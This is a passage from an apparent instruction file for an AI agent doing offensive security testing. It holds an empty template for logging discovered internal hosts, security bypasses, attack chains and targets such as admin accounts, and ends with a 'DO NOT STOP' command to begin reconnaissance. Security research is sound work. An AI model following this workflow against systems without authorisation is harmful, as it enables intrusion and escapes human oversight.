# Internal IPs, hostnames, services discovered
- [ ] Add from error messages, headers, SSRF responses

---

## [INTEL-007] BYPASSES DISCOVERED (WORKING)
# FORMAT: Technique → Endpoint → Proof
- [ ] Add as discovered

---

## [INTEL-008] BYPASSES TESTED (FAILED — DO NOT RETRY)
# Log failures to save time on retry
- [ ] Add here

---

## [INTEL-009] TIMING ANOMALIES
# FORMAT: Endpoint → Normal time → Anomaly time → Significance
- [ ] Add as observed

---

## [INTEL-010] DEVELOPER ASSUMPTION FAILURES
# What the developer assumed was safe but wasn't
- [ ] Add as discovered

---

## [INTEL-011] VALID FINDINGS (CONFIRMED WITH PROOF)
# FORMAT: Title → Severity → Endpoint → Proof (curl command) → Impact
- [ ] Add only confirmed, reproducible findings

---

## [INTEL-012] ATTACK CHAINS (IN PROGRESS)
# FORMAT: Step 1 (finding) → Step 2 → Step 3 → Final Impact
- [ ] Chain A: ____ + ____ = ____
- [ ] Chain B: ____ + ____ = ____

---

## [INTEL-013] NEXT ACTIONS (PRIORITY ORDERED)
# Highest impact next steps based on current knowledge
1. [ ] Highest priority action
2. [ ] Second priority
3. [ ] Third priority

---

## [INTEL-014] QUESTIONS TO ANSWER
# Unknowns that, if answered, unlock new attack surface
- [ ] What user IDs do admin accounts use?
- [ ] What roles exist beyond "user"?
- [ ] Is there a mobile API with less security?
- [ ] What async jobs exist?
- [ ] Add more as they arise

---

## [INTEL-015] PATTERN LIBRARY (REUSE ON ALL TARGETS)
# Techniques that worked — reuse on future targets
- [ ] Add as learned

KNOWLEDGE_EOF

echo "KNOWLEDGE.md initialized. Begin reconnaissance. DO NOT STOP."
```

---

*HIDDEN2.md — Built on the principle that understanding beats scanning.*
*An intelligent AI that reads, thinks, and chains will always outperform a blind fuzzer.*
*Last Updated: 2026 | Philosophy: UNDERSTAND → FIND → CHAIN → VALIDATE → IMPACT*
